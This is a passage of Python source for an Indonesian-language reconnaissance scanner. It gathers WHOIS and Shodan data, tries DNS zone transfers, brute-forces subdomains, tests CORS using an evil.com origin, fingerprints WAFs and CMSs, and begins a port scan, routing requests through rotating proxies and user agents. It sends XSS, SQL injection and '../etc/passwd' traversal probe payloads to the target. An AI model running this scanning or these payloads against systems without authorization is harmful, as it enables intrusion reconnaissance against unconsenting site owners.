
import requests, socket, re, json, asyncio, aiohttp, threading, subprocess, os, random, time
from bs4 import BeautifulSoup
from urllib.parse import urlparse
from dns import resolver, exception
from datetime import datetime

M  = "\033[91m"   
H  = "\033[92m"   
K  = "\033[93m"   
B  = "\033[94m"   
C  = "\033[96m"   
W  = "\033[97m"   
def rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m"

RESET = "\033[0m"

def logo():
    print(rgb(255, 0, 0) + " ____  ____   _____  ______                ")
    print(rgb(255, 85, 0) + "/ ___|  _ \\ / _ \\ \\/ / ___|___  _ __ ___ ")
    print(rgb(255, 170, 0) + "| |   | |_) | | | \\  / |   / _ \\| '__/ _ \\")
    print(rgb(128, 255, 0) + "| |___|  _ <| |_| /  \\ |__| (_) | | |  __/")
    print(rgb(0, 255, 170) + " \\____|_| \\_\\\\___/_/\\_\\____\\___/|_|  \\___|")
    print(rgb(0, 128, 255) + "                                          ")
    print(rgb(180, 180, 180) + "       author : saldy       ")
    print(RESET)

logo()



with open("user_agents.txt", "r") as f:
    USER_AGENTS = [ua.strip() for ua in f.readlines()]

with open("proxies.txt", "r") as f:
    PROXIES = [{"http": p.strip(), "https": p.strip()} for p in f.readlines()]

with open("common.txt", "r") as f:
    WORDLIST = [w.strip() for w in f.readlines()]

HEADERS = lambda: {
    "User-Agent": random.choice(USER_AGENTS),
    "Accept": "*/*",
    "Connection": "keep-alive"
}

PROXY = lambda: random.choice(PROXIES)

LOGS = []

class siWhoisPasif:
    def jalan(self, domain):
        try:
            print(f"{C}[*] siWhoisPasif: Mulai WHOIS reconnaissance terhadap {domain}{RESET}")
            whois_url = f"https://www.whois.com/whois/{domain}"
            res = requests.get(whois_url, headers=HEADERS(), proxies=PROXY(), timeout=15)

            raw = re.findall(r"(?<=<pre class=\"df-raw\" id=\"registryData\">)(.*?)(?=</pre>)", res.text, re.DOTALL)
            if not raw:
                print(f"{K}[~] WHOIS.com gagal parsing HTML, mencoba fallback WHOIS...{RESET}")
                return self.fallback(domain)

            data = raw[0].strip().splitlines()
            whois_data = {}

            for line in data:
                if ":" in line:
                    key, value = line.split(":", 1)
                    key = key.strip().lower()
                    value = value.strip()
                    if key in whois_data:
                        if isinstance(whois_data[key], list):
                            whois_data[key].append(value)
                        else:
                            whois_data[key] = [whois_data[key], value]
                    else:
                        whois_data[key] = value

            penting = {
                "domain name": whois_data.get("domain name", "N/A"),
                "registrar": whois_data.get("registrar", "N/A"),
                "name server": whois_data.get("name server", []),
                "status": whois_data.get("status", "N/A"),
                "creation date": whois_data.get("creation date", "N/A"),
                "expiration date": whois_data.get("registry expiry date", "N/A"),
                "updated date": whois_data.get("updated date", "N/A"),
                "org": whois_data.get("registrant organization", "N/A"),
                "email": whois_data.get("registrant email", "N/A"),
                "phone": whois_data.get("registrant phone", "N/A"),
                "country": whois_data.get("registrant country", "N/A"),
                "dnssec": whois_data.get("dnssec", "N/A")
            }

            print(f"{H}[+] WHOIS utama berhasil diproses, berikut informasi penting:{RESET}")
            for k, v in penting.items():
                if isinstance(v, list):
                    print(f"{B}    {k.capitalize()}:{RESET}")
                    for item in v:
                        print(f"{K}       ↳ {item}{RESET}")
                else:
                    print(f"{B}    {k.capitalize()}:{RESET} {v}")

            if any(str(penting.get("org", "")).lower().startswith(p) for p in ["privacy", "whois", "contact privacy", "domains by proxy"]):
                print(f"{M}[!] WHOIS menggunakan layanan privacy protection! Kemungkinan informasi disembunyikan.{RESET}")

            ns_records = []
            try:
                print(f"{C}[*] Resolving NS via DNS resolver ...{RESET}")
                hasil_ns = resolver.resolve(domain, 'NS')
                for ns in hasil_ns:
                    ns_records.append(str(ns.target).rstrip('.'))
                print(f"{H}[+] NS Records berhasil diambil:{RESET}")
                for ns in ns_records:
                    print(f"{K}    ↳ {ns}{RESET}")
            except Exception as e:
                print(f"{M}[!] Gagal resolve NS - {e}{RESET}")

            final = {
                "whois_detail": penting,
                "ns_records": ns_records
            }

            LOGS.append(final)

        except Exception as e:
            print(f"{M}[!] siWhoisPasif: WHOIS utama gagal - {e}{RESET}")
            self.fallback(domain)

    def fallback(self, domain):
        try:
            print(f"{C}[*] Fallback WHOIS via HackerTarget API ...{RESET}")
            fallback_url = f"https://api.hackertarget.com/whois/?q={domain}"
            r = requests.get(fallback_url, timeout=10)
            if r.status_code == 200 and "No match for" not in r.text:
                print(f"{H}[✓] Data berhasil dari fallback HackerTarget API{RESET}")
                lines = r.text.splitlines()
                fallback_data = {}
                for line in lines:
                    if ":" in line:
                        key, value = line.split(":", 1)
                        fallback_data[key.strip().lower()] = value.strip()
                LOGS.append({"whois_fallback": fallback_data})
                for k, v in fallback_data.items():
                    print(f"{B}    {k.capitalize()}:{RESET} {v}")
            else:
                print(f"{M}[!] Gagal fallback via HackerTarget - respon kosong atau invalid{RESET}")
        except Exception as e:
            print(f"{M}[!] Fallback WHOIS error: {e}{RESET}")

class siShodanKasian:
    def jalan(self, domain):
        try:
            print(f"{B}[*] siShodanKasian: Memulai reconnaissance mendalam menggunakan Shodan API untuk domain {domain}{RESET}")
            ip = socket.gethostbyname(domain)
            print(f"{C}[i] IP address target: {ip}{RESET}")
            try:
                ttl_raw = subprocess.check_output(["ping", "-c", "1", domain], stderr=subprocess.DEVNULL).decode()
                ttl_value = int(re.search(r"ttl=(\d+)", ttl_raw).group(1))
                if ttl_value >= 128:
                    ttl_origin = "Windows Host"
                elif ttl_value >= 64:
                    ttl_origin = "Linux Host"
                else:
                    ttl_origin = "Custom/Proxy/CDN"
                print(f"{K}[~] TTL Detected: {ttl_value} → {ttl_origin}{RESET}")
            except:
                ttl_value = "Unknown"
                ttl_origin = "Undetected"
                print(f"{M}[!] Gagal mengambil TTL dari ping.{RESET}")

            url = f"https://api.shodan.io/shodan/host/{ip}?key=SHODAN_API_KEY"
            res = requests.get(url, timeout=20)
            hasil = res.json()

            if "error" in hasil:
                print(f"{M}[!] Shodan Error: {hasil['error']}{RESET}")
                LOGS.append({"shodan_error": hasil['error']})
                return

            result = {
                "ip": ip,
                "hostnames": hasil.get("hostnames", []),
                "isp": hasil.get("isp", "N/A"),
                "org": hasil.get("org", "N/A"),
                "asn": hasil.get("asn", "N/A"),
                "os": hasil.get("os", "Unknown"),
                "location": {
                    "city": hasil.get("city", "N/A"),
                    "region": hasil.get("region_name", "N/A"),
                    "country": hasil.get("country_name", "N/A"),
                    "latitude": hasil.get("latitude", "N/A"),
                    "longitude": hasil.get("longitude", "N/A")
                },
                "ports": [],
                "services": [],
                "vulnerabilities": [],
                "ttl": ttl_value,
                "ttl_os_guess": ttl_origin
            }

            sensitive_ports = [21, 22, 23, 3306, 6379, 27017, 9200, 5000, 8080, 8443, 5432]
            high_risk_services = []

            for item in hasil.get("data", []):
                port = item.get("port", "N/A")
                product = item.get("product", "Unknown")
                version = item.get("version", "Unknown")
                banner = item.get("data", "").strip().split("\n")[0][:100]
                proto = item.get("transport", "tcp").upper()
                ssl_flag = item.get("ssl", None) is not None

                result["ports"].append(port)
                result["services"].append({
                    "port": port,
                    "product": product,
                    "version": version,
                    "proto": proto,
                    "ssl": ssl_flag,
                    "banner": banner
                })

                if "vulns" in item:
                    for cve in item["vulns"]:
                        result["vulnerabilities"].append(cve)

                if port in sensitive_ports:
                    high_risk_services.append((port, product))

            LOGS.append({"shodan_recon": result})

            print(f"{H}[+] Informasi Umum Shodan:{RESET}")
            print(f"{B}    ▸ Hostnames: {RESET}{', '.join(result['hostnames'])}")
            print(f"{B}    ▸ ISP / Org: {RESET}{result['isp']} / {result['org']}")
            print(f"{B}    ▸ ASN: {RESET}{result['asn']}")
            print(f"{B}    ▸ Lokasi: {RESET}{result['location']['city']}, {result['location']['region']}, {result['location']['country']}")
            print(f"{B}    ▸ Geo: {RESET}Lat: {result['location']['latitude']} | Lon: {result['location']['longitude']}")
            print(f"{B}    ▸ OS Terdeteksi: {RESET}{result['os']}")
            print(f"{B}    ▸ TTL Inference: {RESET}{result['ttl']} → {result['ttl_os_guess']}")
            print(f"{B}    ▸ Port Terbuka: {RESET}{', '.join(map(str, result['ports']))}")
            print(f"{C}    ↪ Fingerprint Service Terbuka:{RESET}")
            for svc in result["services"]:
                ssl_note = f"{H}(SSL){RESET}" if svc['ssl'] else f"{K}(No SSL){RESET}"
                print(f"{K}        → {svc['proto']}:{svc['port']} | {svc['product']} {svc['version']} {ssl_note}")
                print(f"{C}            ↳ Banner: {svc['banner']}{RESET}")

            if result["vulnerabilities"]:
                print(f"{M}[!] Ditemukan Potensi Kerentanan CVE:{RESET}")
                for cve in sorted(set(result["vulnerabilities"])):
                    print(f"{M}     - {cve}{RESET}")
            else:
                print(f"{H}[✓] Tidak ditemukan kerentanan eksplisit pada data Shodan.{RESET}")

            if high_risk_services:
                print(f"{M}[!] Peringatan: Ditemukan port sensitif terbuka!{RESET}")
                for port, prod in high_risk_services:
                    print(f"{M}     - Port {port} ({prod}) rawan dieksploitasi!{RESET}")

        except Exception as e:
            print(f"{M}[!] siShodanKasian: Gagal total akses Shodan - {e}{RESET}")
                
class siDNSZoneBomb:
    def jalan(self, domain):
        try:
            print(f"{B}[*] siDNSZoneBomb: Menganalisis Name Server & AXFR untuk {domain}{RESET}")
            nameservers = resolver.resolve(domain, 'NS')
            nameserver_list = [str(ns.target).rstrip('.') for ns in nameservers]
            print(f"{C}[i] NS ditemukan: {', '.join(nameserver_list)}{RESET}")

            fallback_ns = [
                f"ns1.{domain}", f"ns2.{domain}", f"dns.{domain}", f"zone.{domain}"
            ]
            nameserver_list.extend([ns for ns in fallback_ns if ns not in nameserver_list])

            raw_records, hasil_transfer, ns_success = [], [], None

            for ns in nameserver_list:
                try:
                    print(f"{K}[•] Mencoba AXFR terhadap NS: {ns}{RESET}")
                    zone = resolver.zone_for_name(domain, nameserver=ns)
                    records = zone.nodes.keys()

                    for name in records:
                        rdataset = zone[name]
                        for rdata in rdataset:
                            record_line = f"{name.to_text()} {rdata.to_text()}"
                            hasil_transfer.append(record_line)

                            jenis = type(rdata).__name__
                            raw_records.append({
                                "record_type": jenis,
                                "name": name.to_text(),
                                "data": rdata.to_text()
                            })

                    ns_success = ns
                    print(f"{H}[✓] AXFR BERHASIL di {ns} | {len(hasil_transfer)} record.{RESET}")
                    break

                except Exception as e:
                    print(f"{M}[-] Gagal AXFR ke {ns}: {e}{RESET}")
                    continue

            if not ns_success:
                print(f"{M}[!] Semua percobaan Zone Transfer (AXFR) gagal pada semua NS{RESET}")
                LOGS.append({"zone_transfer": "failed"})
            else:
                record_summary = {}
                filtered_records = {"A": [], "MX": [], "CNAME": [], "TXT": [], "NS": [], "SOA": [], "AAAA": [], "SRV": [], "PTR": []}

                for r in raw_records:
                    jenis = r["record_type"]
                    record_summary[jenis] = record_summary.get(jenis, 0) + 1
                    if jenis in filtered_records:
                        filtered_records[jenis].append(r)

                LOGS.append({
                    "zone_transfer": {
                        "server": ns_success,
                        "record_count": len(hasil_transfer),
                        "summary": record_summary,
                        "filtered": filtered_records
                    }
                })

                print(f"{C}[*] Ringkasan Record Ditransfer (TOP 5 Jenis):{RESET}")
                for jenis, total in sorted(record_summary.items(), key=lambda x: x[1], reverse=True)[:5]:
                    print(f"{B}    - {jenis}: {total}{RESET}")

                print(f"{K}[*] Contoh Record Transfer:{RESET}")
                for i, rec in enumerate(hasil_transfer[:10]):
                    print(f"{W}    [{i+1}] {rec}{RESET}")

            print(f"{B}[*] Mengecek keberadaan DNSSEC & Signature Validity ...{RESET}")
            try:
                dnskey = resolver.resolve(domain, 'DNSKEY')
                if dnskey:
                    print(f"{H}[✓] DNSKEY ditemukan → DNSSEC aktif{RESET}")
                    ds_records = resolver.resolve(domain, 'DS')
                    print(f"{H}[✓] DS record juga tersedia → kemungkinan valid{RESET}")
                    LOGS.append({"dnssec": "active"})
            except Exception as e:
                print(f"{K}[~] DNSSEC tidak aktif atau gagal di-resolve: {e}{RESET}")
                LOGS.append({"dnssec": "not_detected"})

            print(f"{C}[*] Menganalisis TTL & Authority setiap NS ...{RESET}")
            for ns in nameserver_list:
                try:
                    ns_ttl = resolver.resolve(ns, 'A').response.answer[0].ttl
                    print(f"{H}    ↪ {ns} TTL: {ns_ttl}s{RESET}")
                    LOGS.append({"ns_ttl": {ns: ns_ttl}})
                except Exception as e:
                    print(f"{M}    [-] Gagal resolve TTL untuk {ns}: {e}{RESET}")

            print(f"{C}[*] Mapping IP dari NS dan reverse-lookup ...{RESET}")
            for ns in nameserver_list:
                try:
                    ip = socket.gethostbyname(ns)
                    rev = socket.gethostbyaddr(ip)[0]
                    print(f"{H}    ↪ NS: {ns} → IP: {ip} → PTR: {rev}{RESET}")
                    LOGS.append({"ns_mapping": {ns: {"ip": ip, "ptr": rev}}})
                except Exception as e:
                    print(f"{K}    [~] NS: {ns} → Gagal reverse IP: {e}{RESET}")

        except Exception as e:
            print(f"{M}[!] siDNSZoneBomb: Gagal resolve NS utama → {e}{RESET}")
                
class siSubdomainHunter:
    def jalan(self, domain):
        try:
            print(f"{B}[*] siSubdomainHunter: Melakukan pencarian subdomain dari file JavaScript di {domain}...{RESET}")
            subs = set()
            sumber = {}
            resolved = []
            unresolved = []
            cdn_suspect = []
            wildcard_suspect = []
            from_js = []

            js_files = [f"https://{domain}/{w}" for w in WORDLIST if w.endswith('.js')]
            patterns = [
                r"https?://([\w\-]+\." + re.escape(domain) + ")",
                r"['\"]((?:[\w\-]+\.)?" + re.escape(domain) + ")[\"']",
                r"(cdn\.[\w\-]+\." + re.escape(domain) + ")",
                r"(api\.[\w\-]+\." + re.escape(domain) + ")"
            ]

            for js in js_files:
                try:
                    print(f"{C}    [+] Fetch JS: {js}{RESET}")
                    r = requests.get(js, headers=HEADERS(), timeout=6)
                    content_type = r.headers.get("Content-Type", "")
                    if r.status_code != 200 or "javascript" not in content_type:
                        print(f"{K}      [~] Bukan file JS valid. Lewatkan.{RESET}")
                        continue

                    found = set()
                    for pat in patterns:
                        found.update(re.findall(pat, r.text, re.IGNORECASE))

                    valid = [f.strip() for f in found if f.endswith(domain) and f != domain]
                    if valid:
                        subs.update(valid)
                        sumber[js] = valid
                        from_js.extend(valid)
                        print(f"{H}        [✓] {len(valid)} subdomain ditemukan dalam: {js}{RESET}")
                    else:
                        print(f"{K}        [~] Tidak ada subdomain di JS ini.{RESET}")

                except Exception as e:
                    print(f"{M}    [-] Gagal fetch {js} - {e}{RESET}")
                    continue

            print(f"{C}[*] Validasi hasil dengan DNS resolve...{RESET}")
            for sub in sorted(subs):
                try:
                    ip = socket.gethostbyname(sub)
                    resolved.append((sub, ip))
                    print(f"{H}    [✓] Subdomain aktif: {sub} → {ip}{RESET}")
                    if "cdn" in sub or "assets" in sub or "cache" in sub:
                        cdn_suspect.append(sub)
                    if "*" in sub:
                        wildcard_suspect.append(sub)
                except:
                    unresolved.append(sub)
                    print(f"{K}    [~] Tidak dapat di-resolve: {sub}{RESET}")

            brute_found = []
            common = ["dev", "test", "vpn", "cpanel", "internal", "staging", "mobile"]
            print(f"{C}[*] Bruteforce tambahan terhadap subdomain umum...{RESET}")
            for c in common:
                target = f"{c}.{domain}"
                try:
                    ip = socket.gethostbyname(target)
                    brute_found.append((target, ip))
                    subs.add(target)
                    print(f"{H}    [+] Bruteforce success: {target} → {ip}{RESET}")
                except:
                    continue

            LOGS.append({
                "subdomain_hunter": {
                    "total": len(subs),
                    "resolved": resolved,
                    "unresolved": unresolved,
                    "cdn_related": cdn_suspect,
                    "wildcard_detected": wildcard_suspect,
                    "bruteforced": brute_found,
                    "from_js": list(set(from_js)),
                    "sumber_js": sumber
                }
            })

            print(f"{B}[*] Ringkasan Hasil:{RESET}")
            print(f"{H}    ↪ Total Subdomain    : {len(subs)}{RESET}")
            print(f"{H}    ↪ Resolved           : {len(resolved)}{RESET}")
            print(f"{K}    ↪ Unresolved         : {len(unresolved)}{RESET}")
            print(f"{C}    ↪ CDN Related        : {len(cdn_suspect)}{RESET}")
            print(f"{C}    ↪ Wildcard Pattern   : {len(wildcard_suspect)}{RESET}")
            print(f"{H}    ↪ Bruteforce Success : {len(brute_found)}{RESET}")

            if resolved:
                print(f"{C}    ➤ Contoh aktif:{RESET}")
                for s, ip in resolved[:5]:
                    print(f"{B}        → {s} → {ip}{RESET}")
        except Exception as e:
            print(f"{M}[!] siSubdomainHunter: Gagal total - {e}{RESET}")
                
class siCorsKocak:
    def jalan(self, domain):
        try:
            print(f"{B}[*] siCorsKocak: Mengecek kemungkinan CORS Misconfiguration di https://{domain}{RESET}")
            
            origins_to_test = [
                "https://evil.com",
                "null",
                f"https://{domain}",
                f"http://sub.{domain}",
                "http://localhost:3000"
            ]

            total_results = []
            vulnerable = False

            for origin in origins_to_test:
                headers = {
                    "Origin": origin,
                    "Access-Control-Request-Method": "GET",
                    "Access-Control-Request-Headers": "X-Custom-Header",
                    "User-Agent": random.choice(USER_AGENTS)
                }

                try:
                    r = requests.options(f"https://{domain}", headers=headers, timeout=8)
                    allow_origin = r.headers.get("Access-Control-Allow-Origin", "")
                    allow_cred = r.headers.get("Access-Control-Allow-Credentials", "")
                    allow_method = r.headers.get("Access-Control-Allow-Methods", "")
                    allow_headers = r.headers.get("Access-Control-Allow-Headers", "")

                    status = "Safe"
                    reasons = []

                    if allow_origin == "*":
                        status = "Vulnerable"
                        reasons.append("Wildcard origin ('*') diterima")

                    elif origin.lower() in allow_origin.lower():
                        status = "Vulnerable"
                        reasons.append(f"Origin reflektif diterima: {origin}")

                    if allow_cred.lower() == "true":
                        if allow_origin == "*" or origin.lower() in allow_origin.lower():
                            status = "Vulnerable"
                            reasons.append("Allow-Credentials aktif bersamaan dengan origin reflektif/wildcard")

                    if any(m in allow_method for m in ["PUT", "DELETE", "PATCH"]):
                        reasons.append(f"Method berisiko diizinkan: {allow_method}")

                    if "authorization" in allow_headers.lower():
                        reasons.append("Header 'Authorization' diizinkan")

                    result = {
                        "origin_tested": origin,
                        "status": status,
                        "allow_origin": allow_origin,
                        "allow_credentials": allow_cred,
                        "allow_methods": allow_method,
                        "allow_headers": allow_headers,
                        "reasons": reasons
                    }

                    total_results.append(result)

                    if status == "Vulnerable":
                        vulnerable = True
                        print(f"{H}[✓] CORS MISCONFIG dengan Origin: {origin}{RESET}")
                        for r in reasons:
                            print(f"{K}    ↳ {r}{RESET}")
                    else:
                        print(f"{C}[~] CORS aman untuk Origin: {origin}{RESET}")

                except Exception as e:
                    print(f"{M}[!] Gagal OPTIONS untuk origin {origin} - {e}{RESET}")
                    continue

            LOGS.append({
                "cors_analysis": {
                    "domain": domain,
                    "overall_status": "Vulnerable" if vulnerable else "Safe",
                    "tested_origins": total_results
                }
            })

            if not vulnerable:
                print(f"{B}[✓] Tidak ditemukan konfigurasi CORS yang berbahaya berdasarkan pengujian multi-origin.{RESET}")

        except Exception as e:
            print(f"{M}[!] siCorsKocak: Terjadi kesalahan saat menganalisis CORS - {e}{RESET}")
                
class siWafDetektor:
    def jalan(self, domain):
        try:
            print(f"{B}[*] siWafDetektor: Mendeteksi keberadaan Web Application Firewall (WAF) di https://{domain} ...{RESET}")
            url = f"https://{domain}"
            headers = HEADERS()

            try:
                res = requests.get(url, headers=headers, timeout=10)
            except Exception as e:
                print(f"{M}[!] Tidak bisa mengakses halaman utama - {e}{RESET}")
                return

            waf_signatures = {
                "cloudflare": ["cf-ray", "cloudflare", "__cfduid", "cf-cache-status"],
                "sucuri": ["sucuri", "x-sucuri-cache", "x-sucuri-id", "Access Denied - Sucuri Website Firewall"],
                "akamai": ["akamai", "akamai-bot-manager", "_abck"],
                "f5": ["f5", "bigip", "x-waf-status"],
                "imperva": ["imperva", "incapsula", "visid_incap", "x-cdn"],
                "aws": ["aws", "aws-waf", "x-amzn-waf-id", "Blocked by AWS WAF"],
                "stackpath": ["stackpath", "x-stackpath"],
                "barracuda": ["barracuda", "barra-counter", "barracuda-waf"],
                "dome9": ["dome9", "x-dome9", "x-d9"],
                "cloudfront": ["cloudfront", "x-amz-cf-id"],
                "azure": ["x-azure-ref", "azure edge"]
            }

            detected = []
            raw = str(res.headers) + res.text

            for vendor, sigs in waf_signatures.items():
                for s in sigs:
                    if s.lower() in raw.lower():
                        detected.append(vendor)
                        break

            # Behavior probe payloads
            print(f"{C}[*] Melakukan simulasi payload untuk menguji perilaku WAF...{RESET}")
            payloads = [
                "<script>alert(1)</script>",
                "' OR 1=1--",
                "../../../../etc/passwd",
                "UNION SELECT NULL",
                "<img src=x onerror=alert(1)>",
                "%3Cscript%3Ealert(1)%3C%2Fscript%3E"
            ]

            anomalies = []
            for payload in payloads:
                try:
                    test_url = f"https://{domain}/?vuln={payload}"
                    test_headers = headers.copy()
                    test_headers["User-Agent"] = random.choice(USER_AGENTS)
                    test_headers["X-Bypass"] = payload

                    resp = requests.get(test_url, headers=test_headers, timeout=7, allow_redirects=False)

                    if resp.status_code in [403, 406, 501]:
                        anomalies.append({"payload": payload, "status": resp.status_code})
                        print(f"{H}[✓] Payload ditolak ({resp.status_code}) → {payload}{RESET}")
                    elif "blocked" in resp.text.lower() or "access denied" in resp.text.lower():
                        anomalies.append({"payload": payload, "status": "block-page"})
                        print(f"{H}[✓] Halaman blokir terdeteksi untuk: {payload}{RESET}")
                    elif resp.status_code == 302:
                        anomalies.append({"payload": payload, "status": "redirect"})
                        print(f"{K}[~] Redirect abnormal pada payload: {payload}{RESET}")
                    else:
                        print(f"{C}[-] Payload lolos tanpa reaksi signifikan: {payload}{RESET}")
                except Exception as e:
                    print(f"{M}[!] Error pada payload uji '{payload}' - {e}{RESET}")

            mode = "pasif"
            if detected and anomalies:
                mode = "reaktif dan fingerprinted"
            elif anomalies:
                mode = "reaktif"
            elif detected:
                mode = "fingerprinted"
            else:
                mode = "tidak terdeteksi"

            summary = {
                "waf_detected": bool(detected or anomalies),
                "fingerprint": list(set(detected)),
                "behavioral_reaction": anomalies,
                "status": res.status_code,
                "mode": mode,
                "url": url
            }

            LOGS.append({"waf_deep_scan": summary})

            print(f"{B}[*] Ringkasan Deteksi WAF:{RESET}")
            print(f"{C}    ▸ Mode Deteksi: {mode}{RESET}")
            if detected:
                print(f"{H}    ▸ Berdasarkan Fingerprint: {', '.join(set(detected))}{RESET}")
            if anomalies:
                print(f"{K}    ▸ Reaksi terhadap Payload: {len(anomalies)} anomali terdeteksi{RESET}")
            if not detected and not anomalies:
                print(f"{W}    ▸ Tidak ditemukan deteksi WAF mencolok dari fingerprint dan perilaku.{RESET}")

        except Exception as e:
            print(f"{M}[!] siWafDetektor: Error saat menganalisis keberadaan WAF - {e}{RESET}")
                
class siCDNHeadHunter:
    def jalan(self, domain):
        try:
            print(f"{B}[*] siCDNHeadHunter: Menganalisis kemungkinan penggunaan CDN oleh {domain} ...{RESET}")
            ip = socket.gethostbyname(domain)
            print(f"{C}[+] IP ditemukan: {ip}{RESET}")
            try:
                ping_cmd = ["ping", "-c", "1", domain] if os.name != "nt" else ["ping", "-n", "1", domain]
                ttl_output = subprocess.check_output(ping_cmd).decode()
                ttl_match = re.search(r"ttl[=:](\d+)", ttl_output, re.IGNORECASE)
                ttl_value = int(ttl_match.group(1)) if ttl_match else None

                if ttl_value:
                    if ttl_value >= 128:
                        os_guess = "Windows-based Server"
                    elif ttl_value >= 64:
                        os_guess = "Linux/Unix-based Server"
                    else:
                        os_guess = "Unknown/Proxy"
                else:
                    os_guess = "Unknown"

                print(f"{H}[✓] TTL terdeteksi: {ttl_value} → Estimasi OS: {os_guess}{RESET}")
            except Exception as e:
                ttl_value = None
                os_guess = "Unknown"
                print(f"{K}[~] Gagal ambil TTL: {e}{RESET}")

            headers = requests.get(f"https://{domain}", headers=HEADERS(), timeout=10).headers
            cdn_fingerprints = {
                "Cloudflare": ["cf-ray", "cloudflare"],
                "Akamai": ["akamai", "akamai-bot-manager", "x-akamai"],
                "Fastly": ["fastly", "x-served-by", "x-cache-hits"],
                "StackPath": ["stackpath", "x-stackpath"],
                "AWS CloudFront": ["cloudfront", "x-amz-cf-id"],
                "Imperva": ["incapsula", "x-cdn"],
                "Google": ["x-goog-meta", "goog", "x-goog-generation"],
                "Azure": ["x-azure-ref", "x-ms-request-id"]
            }

            detected = []
            for name, keys in cdn_fingerprints.items():
                for key in keys:
                    for h in headers:
                        if key.lower() in h.lower() or key.lower() in str(headers[h]).lower():
                            detected.append(name)
                            break
            try:
                cname_results = resolver.resolve(domain, 'CNAME')
                for cname in cname_results:
                    cname_val = str(cname.target)
                    if "cloudfront" in cname_val:
                        detected.append("AWS CloudFront (via CNAME)")
                    elif "cdn.cloudflare" in cname_val:
                        detected.append("Cloudflare (via CNAME)")
                    elif "edgekey" in cname_val:
                        detected.append("Akamai (edgekey)")
            except:
                pass  

            cdn_used = bool(detected)

            reverse_info = None
            try:
                rev = socket.gethostbyaddr(ip)
                reverse_info = rev[0]
                print(f"{K}[~] Reverse DNS: {reverse_info}{RESET}")
            except:
                reverse_info = "Tidak tersedia"

            confidence = "Tinggi" if len(detected) >= 2 else "Sedang" if detected else "Rendah"

            LOGS.append({
                "cdn_detection": {
                    "ip": ip,
                    "ttl": ttl_value,
                    "os_guess": os_guess,
                    "reverse_dns": reverse_info,
                    "cdns": sorted(set(detected)),
                    "detected": cdn_used,
                    "confidence": confidence
                }
            })

            print(f"{B}[*] Ringkasan Analisis CDN:{RESET}")
            print(f"{C}    → IP: {ip}{RESET}")
            print(f"{C}    → TTL: {ttl_value if ttl_value else 'N/A'} ({os_guess}){RESET}")
            print(f"{C}    → Reverse DNS: {reverse_info}{RESET}")
            if cdn_used:
                print(f"{H}[✓] CDN terdeteksi: {', '.join(sorted(set(detected)))}{RESET}")
                print(f"{K}    ↪ Confidence Level: {confidence}{RESET}")
            else:
                print(f"{K}[~] Tidak ada CDN yang dikenali berdasarkan header atau CNAME.{RESET}")

        except Exception as e:
            print(f"{M}[!] siCDNHeadHunter: Gagal total deteksi CDN - {e}{RESET}")
            
class siCmsNinja:
    def jalan(self, domain):
        try:
            print(f"{B}[*] siCmsNinja: Mendeteksi CMS yang digunakan oleh {domain} ...{RESET}")
            url = f"https://{domain}"
            r = requests.get(url, headers=HEADERS(), timeout=10)
            html = r.text.lower()
            headers = r.headers
            cms_detected = None
            reason = ""
            confidence = 0

            detection_patterns = {
                "WordPress": {
                    "html": ["wp-content", "wp-includes", "xmlrpc.php"],
                    "meta": ["WordPress"],
                    "headers": ["x-generator: wordpress"]
                },
                "Joomla": {
                    "html": ["joomla!", "com_content", "mod_login"],
                    "meta": ["Joomla!"],
                    "headers": []
                },
                "Drupal": {
                    "html": ["drupal.settings", "sites/all/", "drupal.js"],
                    "meta": ["Drupal"],
                    "headers": []
                },
                "Magento": {
                    "html": ["magento"],
                    "meta": [],
                    "headers": ["x-magento-vary"]
                },
                "Ghost": {
                    "html": [],
                    "meta": ["Ghost"],
                    "headers": []
                },
                "PrestaShop": {
                    "html": ["prestashop"],
                    "meta": [],
                    "headers": []
                },
                "OpenCart": {
                    "html": ["index.php?route=", "opencart"],
                    "meta": ["OpenCart"],
                    "headers": []
                },
                "Typo3": {
                    "html": ["typo3/", "t3lib/"],
                    "meta": ["TYPO3"],
                    "headers": []
                },
                "Blogger": {
                    "html": ["blogger.com", "blogspot.com"],
                    "meta": ["blogger"],
                    "headers": []
                }
            }

            soup = BeautifulSoup(html, "html.parser")
            meta_gen = soup.find("meta", attrs={"name": "generator"})
            body_class = soup.find("body")
            body_attrs = body_class.get("class", []) if body_class else []

            detection_log = []

            for cms, clues in detection_patterns.items():
                score = 0
                found = []

                for key in clues["html"]:
                    if key in html:
                        score += 1
                        found.append(f"HTML: {key}")

                for meta in clues["meta"]:
                    if meta_gen and meta.lower() in meta_gen.get("content", "").lower():
                        score += 1
                        found.append(f"Meta: {meta}")

                for hkey in clues["headers"]:
                    hname = hkey.split(":")[0].lower()
                    if hname in [h.lower() for h in headers]:
                        score += 1
                        found.append(f"Header: {hkey}")

                if cms.lower() in " ".join(body_attrs).lower():
                    score += 1
                    found.append(f"Body Class: {cms.lower()}")

                if score > confidence:
                    confidence = score
                    cms_detected = cms
                    reason = ", ".join(found)

            if not cms_detected and meta_gen:
                cms_detected = meta_gen.get("content", "UnknownCMS")
                reason = f"Meta tag: {meta_gen.get('content')}"

            if not cms_detected and "x-powered-by" in headers:
                cms_detected = headers.get("x-powered-by")
                reason = "Header X-Powered-By"

            if cms_detected:
                LOGS.append({
                    "cms_detection": {
                        "cms": cms_detected,
                        "confidence": confidence,
                        "reason": reason,
                        "url": url
                    }
                })
                print(f"{H}[✓] CMS Terdeteksi: {cms_detected} (Confidence: {confidence}){RESET}")
                print(f"{K}    ↪ Alasan Deteksi: {reason}{RESET}")
            else:
                print(f"{K}[~] CMS tidak dapat dikenali dari konten, meta, body class, atau header.{RESET}")
                LOGS.append({
                    "cms_detection": {
                        "cms": None,
                        "confidence": 0,
                        "reason": "Not found",
                        "url": url
                    }
                })

        except Exception as e:
            print(f"{M}[!] siCmsNinja: Error saat mendeteksi CMS - {e}{RESET}")

class siPortManja:
    def jalan(self, domain):
        try:
            print(f"{B}[*] siPortManja: Memulai pemindaian port lengkap terhadap {domain} ...{RESET}")
            ip = socket.gethostbyname(domain)
            print(f"{C}[i] Resolusi IP: {ip}{RESET}")

            ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 465, 587, 993, 995,
                     8080, 8443, 8888, 3306, 5432, 6379, 9200, 27017, 5000, 22, 8000, 11211]
            hasil_scan = []
            timeout = 3

            def scan(port):
                result = {
                    "port": port,
                    "status": "closed",
                    "banner": "",
                    "service_guess": ""
                }
                try:
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                        s.settimeout(timeout)
                        s.connect((ip, port))

                        try:
                            banner = s.recv(2048).decode(errors="ignore").strip()
                            result["banner"] = banner
